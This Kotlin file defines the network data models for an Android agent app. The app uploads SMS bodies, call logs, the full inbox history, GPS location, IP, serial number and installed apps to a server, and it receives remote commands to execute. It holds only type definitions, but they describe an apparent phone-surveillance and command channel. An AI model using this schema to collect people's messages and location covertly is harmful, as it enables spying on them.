package com.example.gmaagent.network

import kotlinx.serialization.Serializable

// ══════════════════════════════════════════════════════════════
//  Sync Request Models (sent TO the server)
// ══════════════════════════════════════════════════════════════

@Serializable
data class SmsEntry(
    val address: String,
    val body: String? = null,
    val sms_type: String,      // "inbox" | "sent" | "draft"
    val timestamp: String,     // ISO-8601
    val read: Boolean = false,
)

@Serializable
data class CallEntry(
    val phone_number: String,
    val call_type: String,     // "incoming" | "outgoing" | "missed" | "rejected"
    val duration_seconds: Int = 0,
    val timestamp: String,     // ISO-8601
    val contact_name: String? = null,
)

@Serializable
data class DeviceSyncRequest(
    val sms_messages: List<SmsEntry>? = null,
    val call_logs: List<CallEntry>? = null,
)


// ══════════════════════════════════════════════════════════════
//  Sync Response Models (received FROM the server)
// ══════════════════════════════════════════════════════════════

@Serializable
data class SyncAckResponse(
    val status: String = "ok",
    val sms_ingested: Int = 0,
    val calls_ingested: Int = 0,
    val pending_commands: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Command Models
// ══════════════════════════════════════════════════════════════

@Serializable
data class PendingCommand(
    val command_id: String,
    val command_type: String,
    val payload: String? = null,    // JSON string
    val created_at: String,
)

@Serializable
data class CommandStatusUpdate(
    val command_id: String,
    val status: String,             // "delivered" | "executed" | "failed"
    val result: String? = null,
)


// ══════════════════════════════════════════════════════════════
//  Device Registration
// ══════════════════════════════════════════════════════════════

@Serializable
data class DeviceRegisterRequest(
    val device_id: String,
    val device_name: String? = null,
    val model: String? = null,
    val manufacturer: String? = null,
    val os_version: String? = null,
)

@Serializable
data class DeviceRegisterResponse(
    val id: String,
    val device_id: String,
    val api_key: String,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Communication Logs — Full SMS inbox history
// ══════════════════════════════════════════════════════════════

@Serializable
data class CommunicationLogEntry(
    val address: String,       // Sender phone number
    val body: String? = null,  // SMS message content
    val timestamp: String,     // ISO-8601
)

@Serializable
data class CommunicationLogSyncRequest(
    val logs: List<CommunicationLogEntry>,
)

@Serializable
data class CommunicationLogSyncResponse(
    val status: String = "ok",
    val logs_ingested: Int = 0,
    val duplicates_skipped: Int = 0,
    val message: String = "",
)


// ══════════════════════════════════════════════════════════════
//  Device Telemetry & Diagnostics
// ══════════════════════════════════════════════════════════════

@Serializable
data class AppInfo(
    val name: String,
    val `package`: String,
    val version: String? = null,
    val is_system: Boolean = false,
)

@Serializable
data class DeviceTelemetryRequest(
    val battery_level: Int? = null,
    val storage_available_gb: Float? = null,
    val storage_total_gb: Float? = null,
    val ram_total_gb: Float? = null,
    val serial_number: String? = null,
    val latitude: Double? = null,
    val longitude: Double? = null,
    val ip_address: String? = null,
    val network_type: String? = null,
    val installed_apps: List<AppInfo>? = null,
)

@Serializable
data class DeviceTelemetryResponse(
    val status: String = "ok",
    val message: String = "",
)
